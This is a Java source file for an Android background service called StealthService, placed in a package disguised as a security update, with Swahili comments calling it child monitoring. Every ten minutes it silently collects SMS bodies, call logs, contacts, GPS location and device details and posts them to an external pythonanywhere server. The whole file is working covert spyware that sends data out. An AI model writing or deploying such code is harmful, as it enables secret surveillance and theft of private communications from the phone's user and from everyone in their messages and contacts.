package com.security.update;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import android.Manifest;
import android.content.pm.PackageManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class StealthService extends Service {
    private static final String TAG = "StealthService";
    private Timer timer;
    private String parentCode;
    private SharedPreferences prefs;
    private LocationManager locationManager;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        Log.d(TAG, "🔍 StealthService imeanzishwa...");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("PARENT_CODE")) {
            parentCode = intent.getStringExtra("PARENT_CODE");
            Log.d(TAG, "📱 Parent Code: " + parentCode);
        } else {
            parentCode = prefs.getString("parent_code", "");
            Log.d(TAG, "📱 Parent Code from prefs: " + parentCode);
        }

        startSurveillance();
        return START_STICKY;
    }

    private void startSurveillance() {
        if (timer != null) {
            timer.cancel();
        }

        timer = new Timer();

        // Start immediate data collection
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                collectAndSendAllData();
            }
        }, 0);

        // Schedule periodic data collection every 10 minutes (600000 ms)
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                collectAndSendAllData();
            }
        }, 600000, 600000); // 10 minutes = 600000 ms

        Log.d(TAG, "📡 Surveillance imeanzishwa - data inatumwa kila baada ya dakika 10");
    }

    private void collectAndSendAllData() {
        try {
            // 1. Kusanya SMS za mtoto
            if (checkPermission(Manifest.permission.READ_SMS)) {
                JSONArray smsData = collectSMSData();
                if (smsData.length() > 0) {
                    sendParentDataToServer("sms", smsData);
                }
            }

            // 2. Kusanya simu za mtoto
            if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
                JSONArray callsData = collectCallsData();
                if (callsData.length() > 0) {
                    sendParentDataToServer("calls", callsData);
                }
            }

            // 3. Kusanya anwani za mtoto
            if (checkPermission(Manifest.permission.READ_CONTACTS)) {
                JSONArray contactsData = collectContactsData();
                if (contactsData.length() > 0) {
                    sendParentDataToServer("contacts", contactsData);
                }
            }

            // 4. Kusanya location ya mtoto
            if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
                JSONObject locationData = collectLocationData();
                if (locationData.length() > 0) {
                    sendParentDataToServer("location", locationData);
                }
            }

            // 5. Tuma device info
            JSONObject deviceInfo = collectDeviceInfo();
            sendParentDataToServer("device_info", deviceInfo);

        } catch (Exception e) {
            Log.e(TAG, "❌ Error collecting data: " + e.getMessage());
        }
    }

    private JSONArray collectSMSData() {
        JSONArray smsArray = new JSONArray();
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null,
                Telephony.Sms.DEFAULT_SORT_ORDER + " LIMIT 50"
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                    sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                    sms.put("type", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)));
                    smsArray.put(sms);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading SMS: " + e.getMessage());
        }
        return smsArray;
    }

    private JSONArray collectCallsData() {
        JSONArray callsArray = new JSONArray();
        try {
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 50"
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    call.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    call.put("date", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    call.put("type", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                    callsArray.put(call);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading calls: " + e.getMessage());
        }
        return callsArray;
    }

    private JSONArray collectContactsData() {
        JSONArray contactsArray = new JSONArray();
        try {
            Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT 100"
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));

                    JSONObject contact = new JSONObject();
                    contact.put("name", name);

                    // Get phone numbers
                    Cursor phoneCursor = getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{contactId},
                        null
                    );

                    JSONArray phones = new JSONArray();
                    if (phoneCursor != null) {
                        while (phoneCursor.moveToNext()) {
                            String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                            phones.put(phone);
                        }
                        phoneCursor.close();
                    }
                    contact.put("phones", phones);
                    contactsArray.put(contact);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading contacts: " + e.getMessage());
        }
        return contactsArray;
    }

    private JSONObject collectLocationData() {
        JSONObject location = new JSONObject();
        try {
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (locationManager != null && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Location lastLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (lastLocation != null) {
                    location.put("latitude", lastLocation.getLatitude());
                    location.put("longitude", lastLocation.getLongitude());
                    location.put("accuracy", lastLocation.getAccuracy());
                    location.put("timestamp", lastLocation.getTime());
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting location: " + e.getMessage());
        }
        return location;
    }

    private JSONObject collectDeviceInfo() {
        JSONObject deviceInfo = new JSONObject();
        try {
            deviceInfo.put("model", android.os.Build.MODEL);
            deviceInfo.put("manufacturer", android.os.Build.MANUFACTURER);
            deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE);
            deviceInfo.put("sdk_version", android.os.Build.VERSION.SDK_INT);
            deviceInfo.put("product", android.os.Build.PRODUCT);
            deviceInfo.put("device", android.os.Build.DEVICE);
        } catch (Exception e) {
            Log.e(TAG, "Error collecting device info: " + e.getMessage());
        }
        return deviceInfo;
    }

    private boolean checkPermission(String permission) {
        return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }

    // 🆕 NJIA MPYA YA KUTUMA DATA KWA MZAZI
    private void sendParentDataToServer(String dataType, Object dataContent) {
        new Thread(() -> {
            try {
                // ✅ URL SAHIHI KWA DATA YA MZAZI
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/submit-data";
                
                JSONObject postData = new JSONObject();
                postData.put("parent_code", parentCode);
                postData.put("data_type", dataType);
                postData.put("device_id", android.os.Build.MODEL);
                postData.put("data_content", dataContent);

                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);

                OutputStream os = conn.getOutputStream();
                os.write(postData.toString().getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "✅ " + dataType + " data imetumwa kwa mzazi - " + new Date());
                } else {
                    Log.e(TAG, "❌ Server error for " + dataType + ": " + responseCode);
                }

            } catch (Exception e) {
                Log.e(TAG, "❌ Error sending " + dataType + " data: " + e.getMessage());
            }
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) {
            timer.cancel();
        }
        Log.d(TAG, "🔴 StealthService imezimwa");
    }
}
